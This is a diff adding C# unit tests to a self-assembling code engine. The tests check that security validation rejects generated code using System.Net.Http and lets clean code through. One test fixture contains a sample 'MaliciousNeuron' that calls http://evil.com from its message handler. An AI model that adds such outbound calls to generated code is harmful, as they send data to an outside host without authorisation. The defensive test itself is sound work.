@@ -525,6 +525,111 @@ public class SelfAssemblyEngineTests : IAsyncDisposable
 
     #endregion
 
+    #region Security Validation Tests
+
+    [Fact]
+    public async Task AssemblyFailed_Event_ShouldFireOnSecurityViolation()
+    {
+        // Arrange
+        var eventFired = false;
+        AssemblyFailedEvent? receivedEvent = null;
+
+        _engine.AssemblyFailed += (_, e) =>
+        {
+            eventFired = true;
+            receivedEvent = e;
+        };
+
+        var blueprint = CreateBlueprint(name: "MaliciousNeuron");
+        SetupPassingValidation();
+
+        // Setup code generator to produce code with forbidden namespaces
+        _engine.SetCodeGenerator(_ => Task.FromResult("""
+            using System;
+            using System.Net.Http;
+            using Ouroboros.Domain.Autonomous;
+
+            namespace Ouroboros.SelfAssembled
+            {
+                public class MaliciousNeuron : Neuron
+                {
+                    private readonly HttpClient _client = new HttpClient();
+                    
+                    public MaliciousNeuron() : base("MaliciousNeuron")
+                    {
+                        Subscribe("test.topic");
+                    }
+
+                    protected override async Task OnMessageAsync(NeuronMessage message)
+                    {
+                        await _client.GetStringAsync("http://evil.com");
+                    }
+                }
+            }
+            """));
+
+        // Act
+        var submitResult = await _engine.SubmitBlueprintAsync(blueprint);
+        await _engine.ApproveProposalAsync(submitResult.Value);
+
+        // Wait for security validation failure
+        await Task.Delay(1000);
+
+        // Assert
+        eventFired.Should().BeTrue();
+        receivedEvent.Should().NotBeNull();
+        receivedEvent!.NeuronName.Should().Be("MaliciousNeuron");
+        receivedEvent.Reason.Should().Contain("Security validation failed");
+        receivedEvent.Reason.Should().Contain("System.Net.Http");
+    }
+
+    [Fact]
+    public async Task SecurityValidation_WithCleanCode_ShouldPassValidation()
+    {
+        // Arrange
+        var blueprint = CreateBlueprint(name: "CleanNeuron");
+        SetupPassingValidation();
+        
+        // Setup code generator with clean, safe code (even if it doesn't compile correctly)
+        _engine.SetCodeGenerator(_ => Task.FromResult("""
+            using System;
+            using System.Threading;
+            using System.Threading.Tasks;
+            using Ouroboros.Domain.Autonomous;
+
+            namespace Ouroboros.SelfAssembled
+            {
+                public class CleanNeuron : Neuron
+                {
+                    // Clean code with only safe namespaces
+                    protected override async Task OnMessageAsync(NeuronMessage message)
+                    {
+                        await Task.CompletedTask;
+                    }
+                }
+            }
+            """));
+
+        // Act
+        var submitResult = await _engine.SubmitBlueprintAsync(blueprint);
+        await _engine.ApproveProposalAsync(submitResult.Value);
+
+        // Wait for processing
+        await Task.Delay(1000);
+
+        // Assert - Security validation should pass (even if compilation might fail due to API mismatch)
+        var proposal = _engine.GetProposal(submitResult.Value);
+        proposal.Should().NotBeNull();
+        
+        // Verify security validation passed by checking it's not rejected for security reasons
+        var history = _engine.GetStateHistory(submitResult.Value);
+        var securityFailure = history.FirstOrDefault(s => 
+            s.Details != null && s.Details.Contains("Security validation failed"));
+        securityFailure.Should().BeNull("Security validation should pass for clean code");
+    }
+
+    #endregion
+
     #region Helper Methods
 
     private NeuronBlueprint CreateBlueprint(
